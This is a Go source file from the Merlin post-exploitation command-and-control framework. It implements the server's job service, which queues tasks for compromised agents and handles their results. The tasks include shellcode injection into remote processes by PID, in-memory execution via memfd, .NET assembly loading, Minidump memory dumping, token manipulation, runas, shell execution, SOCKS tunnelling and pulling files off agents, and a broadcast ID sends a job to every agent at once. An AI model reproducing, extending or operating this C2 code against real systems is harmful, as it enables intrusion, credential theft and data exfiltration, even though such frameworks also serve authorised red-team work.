// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2022  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

// Package job is a service used to interact with Agent Jobs
package job

import (
	// Standard
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	// 3rd Party
	uuid "github.com/satori/go.uuid"

	// Internal
	messageAPI "github.com/Ne0nd0g/merlin/pkg/api/messages"
	cli "github.com/Ne0nd0g/merlin/pkg/cli/core"
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/jobs"
	"github.com/Ne0nd0g/merlin/pkg/jobs/memory"
	"github.com/Ne0nd0g/merlin/pkg/messages"
	"github.com/Ne0nd0g/merlin/pkg/modules/socks"
	"github.com/Ne0nd0g/merlin/pkg/services/agent"
)

// Service holds references to repositories to manage Job objects
type Service struct {
	jobRepo      jobs.Repository
	agentService *agent.Service
}

// memoryService is an in-memory instantiation of the Agent service so that it can be used by others
var memoryService *Service

// NewJobService is a factory to create a Job service to be used by other packages or services
func NewJobService() *Service {
	if memoryService == nil {
		memoryService = &Service{
			jobRepo:      WithJobMemoryRepository(),
			agentService: agent.NewAgentService(),
		}
	}
	// Start the SOCKS infinite loop
	go memoryService.socksJobs()
	return memoryService
}

func WithJobMemoryRepository() jobs.Repository {
	return memory.NewRepository()
}

func (s *Service) Add(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
	var job jobs.Job

	switch jobType {
	case "agentInfo":
		job.Type = jobs.CONTROL
		job.Payload = jobs.Command{
			Command: "agentInfo",
		}
	case "download":
		job.Type = jobs.FILETRANSFER
		p := jobs.FileTransfer{
			FileLocation: jobArgs[0],
			IsDownload:   false,
		}
		job.Payload = p
	case "cd":
		job.Type = jobs.NATIVE
		p := jobs.Command{
			Command: "cd",
			Args:    jobArgs[0:],
		}
		job.Payload = p
	case "changelistener":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) >= 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "CreateProcess":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "env":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "exit":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobArgs[0], // TODO, this should be in jobType position
		}
		job.Payload = p
	case "ifconfig":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: jobType,
		}
	case "initialize":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobType,
		}
		job.Payload = p
	case "invoke-assembly":
		if len(jobArgs) < 1 {
			return "", fmt.Errorf("exected 1 argument for the invoke-assembly command, received: %+v", jobArgs)
		}
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: "clr",
			Args:    append([]string{jobType}, jobArgs...),
		}
	case "ja3":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "killdate":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobArgs[0],
		}
		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "killprocess":
		job.Type = jobs.NATIVE
		p := jobs.Command{
			Command: "killprocess",
			Args:    jobArgs,
		}
		job.Payload = p
	case "link":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: "link",
			Args:    jobArgs,
		}
		job.Payload = p
	case "listener":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: "listener",
			Args:    jobArgs,
		}
		job.Payload = p
	case "list-assemblies":
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: "clr",
			Args:    []string{"list-assemblies"},
		}
	case "load-assembly":
		// jobArgs[0] - server-side source file location
		// jobArgs[1] - Assembly name
		// jobArgs[2] - calculated SHA256 hash
		if len(jobArgs) < 1 {
			return "", fmt.Errorf("exected 1 argument for the load-assembly command, received: %+v", jobArgs)
		}
		job.Type = jobs.MODULE
		assembly, err := ioutil.ReadFile(jobArgs[0])
		if err != nil {
			return "", fmt.Errorf("there was an error reading the assembly at %s:\n%s", jobArgs[0], err)
		}

		name := filepath.Base(jobArgs[0])
		if len(jobArgs) > 1 {
			name = jobArgs[1]
		}

		fileHash := sha256.New()
		_, err = io.WriteString(fileHash, string(assembly))
		if err != nil {
			return "", fmt.Errorf("there was an error generating a file hash: %s", err)
		}
		jobArgs = append(jobArgs, fmt.Sprintf("%s", fileHash.Sum(nil)))

		job.Payload = jobs.Command{
			Command: "clr",
			Args:    []string{jobType, base64.StdEncoding.EncodeToString([]byte(assembly)), name},
		}
	case "load-clr":
		if len(jobArgs) < 1 {
			return "", fmt.Errorf("exected 1 argument for the load-clr command, received: %+v", jobArgs)
		}
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: "clr",
			Args:    append([]string{jobType}, jobArgs...),
		}
	case "ls":
		job.Type = jobs.NATIVE
		p := jobs.Command{
			Command: "ls", // TODO This should be in the jobType position
		}

		if len(jobArgs) > 0 {
			p.Args = jobArgs[0:]
		} else {
			p.Args = []string{"./"}
		}
		job.Payload = p
	case "maxretry":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobArgs[0], // TODO This should be in the jobType position
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "memory":
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "memfd":
		if len(jobArgs) < 1 {
			return "", fmt.Errorf("expected 1 argument for the memfd command, received %d", len(jobArgs))
		}
		executable, err := ioutil.ReadFile(jobArgs[0])
		if err != nil {
			return "", fmt.Errorf("there was an error reading %s: %v", jobArgs[0], err)
		}
		fileHash := sha256.New()
		_, err = io.WriteString(fileHash, string(executable))
		if err != nil {
			return "", fmt.Errorf("there was an error generating file hash: %s", err)
		}
		b := base64.StdEncoding.EncodeToString(executable)
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    append([]string{b}, jobArgs[1:]...),
		}
	case "Minidump":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "netstat":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "nslookup":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "padding":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "pipes":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: "pipes",
		}
		job.Payload = p
	case "ps":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: "ps",
		}
		job.Payload = p
	case "pwd":
		job.Type = jobs.NATIVE
		p := jobs.Command{
			Command: jobArgs[0], // TODO This should be in the jobType position
		}
		job.Payload = p
	case "rm":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs[0:1],
		}
	case "run", "exec":
		job.Type = jobs.CMD
		payload := jobs.Command{
			Command: jobArgs[0],
		}
		if len(jobArgs) > 1 {
			payload.Args = jobArgs[1:]
		}
		job.Payload = payload
	case "runas":
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "sdelete":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "shell":
		job.Type = jobs.CMD
		payload := jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = payload
	case "shellcode":
		job.Type = jobs.SHELLCODE
		payload := jobs.Shellcode{
			Method: jobArgs[0],
		}

		if payload.Method == "self" {
			payload.Bytes = jobArgs[1]
		} else if payload.Method == "remote" || payload.Method == "rtlcreateuserthread" || payload.Method == "userapc" {
			i, err := strconv.Atoi(jobArgs[1])
			if err != nil {
				return "", err
			}
			payload.PID = uint32(i)
			payload.Bytes = jobArgs[2]
		}
		job.Payload = payload
	case "skew":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "sleep":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "ssh":
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "token":
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "touch":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "unlink":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: "unlink",
			Args:    jobArgs,
		}
		job.Payload = p
	case "upload":
		// jobArgs[0] - server-side source file location
		// jobArgs[1] - agent-side file write location
		// jobArgs[2] - calculated SHA256 hash
		// jobArgs[3] - file size
		job.Type = jobs.FILETRANSFER
		if len(jobArgs) < 2 {
			return "", fmt.Errorf("expected 2 arguments for upload command, received %d", len(jobArgs))
		}
		uploadFile, uploadFileErr := ioutil.ReadFile(jobArgs[0])
		if uploadFileErr != nil {
			// TODO send "ServerOK"
			return "", fmt.Errorf("there was an error reading %s: %v", jobs.String(job.Type), uploadFileErr)
		}
		fileHash := sha256.New()
		_, err := io.WriteString(fileHash, string(uploadFile))
		if err != nil {
			return "", fmt.Errorf("there was an error generating file hash: %s", err)
		}
		if len(jobArgs) > 2 {
			jobArgs[2] = fmt.Sprintf("%s", fileHash.Sum(nil))
		} else {
			jobArgs = append(jobArgs, fmt.Sprintf("%s", fileHash.Sum(nil)))
		}

		if len(jobArgs) > 3 {
			jobArgs[3] = fmt.Sprintf("%d", len(uploadFile))
		} else {
			jobArgs = append(jobArgs, fmt.Sprintf("%d", len(uploadFile)))
		}

		p := jobs.FileTransfer{
			FileLocation: jobArgs[1],
			FileBlob:     base64.StdEncoding.EncodeToString([]byte(uploadFile)),
			IsDownload:   true,
		}
		job.Payload = p
	case "uptime":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: "uptime",
		}
		job.Payload = p
	default:
		return "", fmt.Errorf("invalid job type: %d", job.Type)
	}

	return s.AddJobChannel(agentID, &job, jobArgs)
}

// AddJobChannel adds an already built Agent Job to the agent's job channel to be sent to the agent when it checks in.
// A server-side job tracking structure is also added to track job status
func (s *Service) AddJobChannel(agentID uuid.UUID, job *jobs.Job, jobArgs []string) (results string, err error) {
	agents := s.agentService.Agents()
	// If the Agent is set to broadcast identifier for ALL agents
	if agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff" {
		if len(agents) <= 0 {
			return results, fmt.Errorf("there are 0 available agents, no jobs were created")
		}
		results = "Creating jobs for all agents through broadcast identifier ffffffff-ffff-ffff-ffff-ffffffffffff"
		for _, a := range agents {
			err = s.buildJob(a.ID(), job, jobArgs)
			if err != nil {
				return results, err
			}
			results += fmt.Sprintf("\n\tCreated job %s for agent %s at %s", job.ID, a.ID(), time.Now().UTC().Format(time.RFC3339))
		}
	} else {
		// A single Agent
		err = s.buildJob(agentID, job, jobArgs)
		if err != nil {
			return results, err
		}
		results += fmt.Sprintf("Created job %s for agent %s at %s", job.ID, agentID, time.Now().UTC().Format(time.RFC3339))
	}
	return results, nil
}

// buildJob fills in the server-side derived fields for an Agent's job and then adds it to the Agent's job channel
// to be sent to the agent when it checks in.
// A server-side job tracking structure is also added to track job status.
// The job is also added to the server-side agent log file
func (s *Service) buildJob(agentID uuid.UUID, job *jobs.Job, jobArgs []string) error {
	agent, err := s.agentService.Agent(agentID)

	if err != nil {
		return fmt.Errorf("pkg/server/jobs.buildJob(): there was an error adding a job because %s is an unknown agent", agentID)
	}
	job.AgentID = agentID

	var command string
	// Update the Command field of the Job info structure
	switch job.Type {
	case jobs.CONTROL, jobs.MODULE, jobs.NATIVE:
		cmd := job.Payload.(jobs.Command)
		if job.Type == jobs.MODULE {
			if strings.ToLower(cmd.Command) == "clr" && strings.ToLower(cmd.Args[0]) == "load-assembly" {
				if len(jobArgs) > 2 {
					msg := fmt.Sprintf("loading assembly from %s with a SHA256: %s to agent", jobArgs[0], jobArgs[2])
					agent.Log(msg)
				}
			}
		}
		args := fmt.Sprintf("%s", strings.Join(cmd.Args, " "))
		// Truncate to 30 characters
		if len(args) > 30 {
			args = fmt.Sprintf("%s...", args[:30])
		}
		command = fmt.Sprintf("%s %s", cmd.Command, args)
	case jobs.CMD:
		cmd := job.Payload.(jobs.Command)
		args := fmt.Sprintf("%s", strings.Join(cmd.Args, " "))
		// Truncate to 30 characters
		if len(args) > 30 {
			args = fmt.Sprintf("%s...", args[:30])
		}
		if strings.ToLower(cmd.Command) == "shell" {
			command = strings.TrimSpace(fmt.Sprintf("%s %s", cmd.Command, args))
		} else {
			command = strings.TrimSpace(fmt.Sprintf("run %s %s", cmd.Command, args))
		}
	case jobs.FILETRANSFER:
		cmd := job.Payload.(jobs.FileTransfer)
		if cmd.IsDownload {
			// Upload to agent (the server is uploading a file that the agent is downloading the file from the server)
			if len(jobArgs) > 2 {
				msg := fmt.Sprintf(
					"Uploading file from server at %s of size %s bytes and SHA-256: %x to agent at %s",
					jobArgs[0],
					jobArgs[3],
					jobArgs[2],
					jobArgs[1],
				)
				agent.Log(msg)
				command = fmt.Sprintf("upload %s %s", jobArgs[0], jobArgs[1])
			}
		} else {
			// Download from agent (the server is download a file to the agent is uploading a file to the server)
			if len(jobArgs) > 0 {
				command = fmt.Sprintf("download %s", jobArgs[0])
				agent.Log(fmt.Sprintf("Downloading file from agent at %s\n", jobArgs[0]))
			}
		}
	case jobs.SHELLCODE:
		cmd := job.Payload.(jobs.Shellcode)
		command = fmt.Sprintf("shellcode %s %d length %d", cmd.Method, cmd.PID, len(cmd.Bytes))
	case jobs.SOCKS:
		conn := job.Payload.(jobs.Socks)
		command = fmt.Sprintf("SOCKS connection %s packet %d", conn.ID, conn.Index)
	default:
		fmt.Printf("DEFAULT\n")
		command = fmt.Sprintf("%s %+v", jobs.String(job.Type), job.Payload)
	}

	// Create Job info structure
	jobInfo := jobs.NewInfo(agentID, jobs.String(job.Type), command)

	// SOCKS jobs create their own token that is used through the lifetime of the connection
	if job.Token == uuid.Nil {
		job.Token = jobInfo.Token()
	}

	// SOCKS jobs create their own job ID and use the same through to the end of the connection
	if job.ID == "" {
		job.ID = jobInfo.ID()
	}

	// Add job to the server side job list
	s.jobRepo.Add(*job, jobInfo)

	// Log the job
	msg := fmt.Sprintf("Created job Type:%s, ID:%s, Status:%s, Command:%s",
		messages.String(job.Type),
		job.ID,
		"Created",
		command,
	)
	agent.Log(msg)
	return nil
}

// checkJob verifies that the input job message contains the expected token and was not already completed
func (s *Service) checkJob(job jobs.Job) error {
	// Check to make sure agent UUID is in dataset
	if !s.agentService.Exist(job.AgentID) {
		return fmt.Errorf("job %s was for an invalid agent %s", job.ID, job.AgentID)
	}
	j, err := s.jobRepo.GetInfo(job.ID)
	if err != nil {
		return fmt.Errorf("pkg/services/job.checkJob: %s", err)
	}

	if job.Token != j.Token() {
		return fmt.Errorf("job %s for agent %s did not contain the correct token. Expected: %s, Got: %s", job.ID, job.AgentID, j.Token(), job.Token)
	}
	if j.Status() == jobs.COMPLETE {
		return fmt.Errorf("job %s for agent %s was previously completed on %s", job.ID, job.AgentID, j.Completed())
	}
	if j.Status() == jobs.CANCELED {
		return fmt.Errorf("job %s for agent %s was previously canceled on", job.ID, job.AgentID)
	}
	return nil
}

// Clear removes any jobs in the queue that have been created, but NOT sent to the agent
func (s *Service) Clear(agentID uuid.UUID) error {
	return s.jobRepo.Clear(agentID)
}

// ClearAll removes all unsent jobs across all agents
func (s *Service) ClearAll() error {
	return s.jobRepo.ClearAll()
}

// fileTransfer handles file upload/download operations
func (s *Service) fileTransfer(agentID uuid.UUID, p jobs.FileTransfer) error {
	// Check to make sure it is a known agent
	if !s.agentService.Exist(agentID) {
		return fmt.Errorf("%s is not a valid agent", agentID)
	}

	if p.IsDownload {
		agentsDir := filepath.Join(core.CurrentDir, "data", "agents")
		_, f := filepath.Split(p.FileLocation) // We don't need the directory part for anything
		if _, errD := os.Stat(agentsDir); os.IsNotExist(errD) {
			errorMessage := fmt.Errorf("there was an error locating the agent's directory:\r\n%s", errD.Error())
			err := s.agentService.Log(agentID, errorMessage.Error())
			if err != nil {
				return fmt.Errorf("there were to errors:\n\t%s\n\t%s", errorMessage, err)
			}
			return errorMessage
		}
		userMessage := messageAPI.UserMessage{
			Level:   messageAPI.Success,
			Time:    time.Now().UTC(),
			Message: fmt.Sprintf("Results for %s at %s", agentID, time.Now().UTC().Format(time.RFC3339)),
		}
		messageAPI.SendBroadcastMessage(userMessage)
		downloadBlob, downloadBlobErr := base64.StdEncoding.DecodeString(p.FileBlob)

		if downloadBlobErr != nil {
			errorMessage := fmt.Errorf("there was an error decoding the fileBlob:\r\n%s", downloadBlobErr.Error())
			err := s.agentService.Log(agentID, errorMessage.Error())
			if err != nil {
				return fmt.Errorf("there were to errors:\n\t%s\n\t%s", errorMessage, err)
			}
			return errorMessage
		}
		downloadFile := filepath.Join(agentsDir, agentID.String(), f)
		writingErr := ioutil.WriteFile(downloadFile, downloadBlob, 0600)
		if writingErr != nil {
			errorMessage := fmt.Errorf("there was an error writing to -> %s:\r\n%s", p.FileLocation, writingErr.Error())
			err := s.agentService.Log(agentID, errorMessage.Error())
			if err != nil {
				return fmt.Errorf("there were to errors:\n\t%s\n\t%s", errorMessage, err)
			}
			return errorMessage
		}
		successMessage := fmt.Sprintf("Successfully downloaded file %s with a size of %d bytes from agent %s to %s",
			p.FileLocation,
			len(downloadBlob),
			agentID.String(),
			downloadFile)

		userMessage = messageAPI.UserMessage{
			Level:   messageAPI.Success,
			Time:    time.Now().UTC(),
			Message: successMessage,
		}
		messageAPI.SendBroadcastMessage(userMessage)

		err := s.agentService.Log(agentID, successMessage)
		if err != nil {
			return err
		}
	}

	return nil
}

// Get returns a list of jobs that need to be sent to the agent
func (s *Service) Get(agentID uuid.UUID) ([]jobs.Job, error) {
	return s.jobRepo.GetJobs(agentID)
}

// GetTableActive returns a list of rows that contain information about active jobs
func (s *Service) GetTableActive(agentID uuid.UUID) ([][]string, error) {

	var agentJobs [][]string
	if !s.agentService.Exist(agentID) {
		return agentJobs, fmt.Errorf("%s is not a valid agent", agentID)
	}

	for id, job := range s.jobRepo.GetAll() {
		if job.AgentID() == agentID {
			//message("debug", fmt.Sprintf("GetTableActive(%s) ID: %s, Job: %+v", agentID.String(), id, job))
			var status string
			switch job.Status() {
			case jobs.ACTIVE:
				status = "Active"
			case jobs.CREATED:
				status = "Created"
			case jobs.SENT:
				status = "Sent"
			case jobs.RETURNED:
				status = "Returned"
			default:
				status = fmt.Sprintf("Unknown job status: %d", job.Status())
			}
			var zeroTime time.Time
			// Don't add completed or canceled jobs
			if job.Status() != jobs.COMPLETE && job.Status() != jobs.CANCELED {
				var sent string
				if job.Sent() != zeroTime {
					sent = job.Sent().Format(time.RFC3339)
				}
				// <JobID>, <Command>, <JobStatus>, <Created>, <Sent>
				agentJobs = append(agentJobs, []string{
					id,
					job.Command(),
					status,
					job.Created().Format(time.RFC3339),
					sent,
				})
			}
		}
	}
	return agentJobs, nil
}

// GetTableAll returns all unsent jobs to be displayed as a table
func (s *Service) GetTableAll() [][]string {
	var agentJobs [][]string

	for id, job := range s.jobRepo.GetAll() {
		var status string
		switch job.Status() {
		case jobs.CREATED:
			status = "Created"
		case jobs.SENT:
			status = "Sent"
		case jobs.RETURNED:
			status = "Returned"
		default:
			status = fmt.Sprintf("Unknown job status: %d", job.Status())
		}
		if job.Status() != jobs.COMPLETE && job.Status() != jobs.CANCELED {
			var zeroTime time.Time
			var sent string
			if job.Sent() != zeroTime {
				sent = job.Sent().Format(time.RFC3339)
			}

			agentJobs = append(agentJobs, []string{
				job.AgentID().String(),
				id,
				job.Command(),
				status,
				job.Created().Format(time.RFC3339),
				sent,
			})
		}
	}
	return agentJobs
}

// Handler evaluates a message sent in by the agent and the subsequently executes any corresponding tasks
func (s *Service) Handler(agentJobs []jobs.Job) error {
	// Iterate over each job
	for _, job := range agentJobs {
		// Make sure the Agent is known to the server
		if s.agentService.Exist(job.AgentID) {
			agent, err := s.agentService.Agent(job.AgentID)
			if err != nil {
				return err
			}

			// Get the job info structure
			jobInfo, err := s.jobRepo.GetInfo(job.ID)
			if err != nil {
				return fmt.Errorf("pkg/services/job.Handler(): %s", err)
			}

			// Verify that the job contains the correct token and that it was not already completed
			err = s.checkJob(job)
			if err != nil {

				// Agent will send back error messages that are not the result of a job
				if job.Type != jobs.RESULT {
					return err
				}
				if core.Debug {
					fmt.Printf("Received %s message without job token: %s\n", messages.String(job.Type), err)
				}
			}
			switch job.Type {
			case jobs.RESULT:
				agent.Log(fmt.Sprintf("Results for job: %s", job.ID))

				userMessage := messageAPI.UserMessage{
					Level:   messageAPI.Note,
					Time:    time.Now().UTC(),
					Message: fmt.Sprintf("Results job %s for agent %s at %s", job.ID, job.AgentID, time.Now().UTC().Format(time.RFC3339)),
				}
				messageAPI.SendBroadcastMessage(userMessage)
				result := job.Payload.(jobs.Results)
				if len(result.Stdout) > 0 {
					agent.Log(fmt.Sprintf("Command Results (stdout):\r\n%s", result.Stdout))
					userMessage = messageAPI.UserMessage{
						Level:   messageAPI.Success,
						Time:    time.Now().UTC(),
						Message: result.Stdout,
					}
					messageAPI.SendBroadcastMessage(userMessage)
				}
				if len(result.Stderr) > 0 {
					agent.Log(fmt.Sprintf("Command Results (stderr):\r\n%s", result.Stderr))
					userMessage = messageAPI.UserMessage{
						Level:   messageAPI.Warn,
						Time:    time.Now().UTC(),
						Message: result.Stderr,
					}
					messageAPI.SendBroadcastMessage(userMessage)
				}
			case jobs.AGENTINFO:
				err = s.agentService.UpdateAgentInfo(job.AgentID, job.Payload.(messages.AgentInfo))
				if err != nil {
					return err
				}
				//agent.UpdateInfo(job.Payload.(messages.AgentInfo))
			case jobs.FILETRANSFER:
				err = s.fileTransfer(job.AgentID, job.Payload.(jobs.FileTransfer))
				if err != nil {
					return err
				}
			case jobs.SOCKS:
				// Send to SOCKS client
				socks.In(job)
			}
			// Update Jobs Info structure

			if job.Type == jobs.SOCKS {
				if job.Payload.(jobs.Socks).Close {
					jobInfo.Complete()
				} else {
					jobInfo.Active()
				}
			} else {
				jobInfo.Complete()
			}
			err = s.jobRepo.UpdateInfo(jobInfo)
			if err != nil {
				return fmt.Errorf("pkg/services/job.Handler(): %s", err)
			}
		} else {
			userMessage := messageAPI.UserMessage{
				Level:   messageAPI.Warn,
				Time:    time.Now().UTC(),
				Message: fmt.Sprintf("Job %s was for an invalid agent %s", job.ID, job.AgentID),
			}
			messageAPI.SendBroadcastMessage(userMessage)
		}
	}
	return nil
}

// socksJobs is used as a go routine to listen for data coming from a SOCKS client that needs to be sent to the Merlin agent
func (s *Service) socksJobs() {
	for {
		job := <-socks.JobsOut
		err := s.buildJob(job.AgentID, &job, nil)

		if err != nil {
			msg := messageAPI.ErrorMessage(fmt.Sprintf("there was an error creating a job for SOCKS traffic to the agent: %s", err))
			cli.MessageChannel <- msg
		}
	}

}